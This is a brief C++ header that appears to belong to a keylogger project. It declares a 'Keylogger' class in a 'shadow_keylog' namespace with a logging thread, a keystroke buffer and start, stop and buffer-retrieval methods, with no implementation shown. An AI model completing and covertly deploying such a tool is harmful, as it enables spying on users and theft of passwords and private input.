#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include <string>
#include <thread>
#include <atomic>

namespace shadow_keylog {
    class Keylogger {
    private:
        std::thread* logger_thread;
        std::atomic<bool> running;
        std::string buffer;
        
        void log_keys();
        
    public:
        Keylogger();
        ~Keylogger();
        
        void start();
        void stop();
        std::string get_buffer();
    };
}

#endif
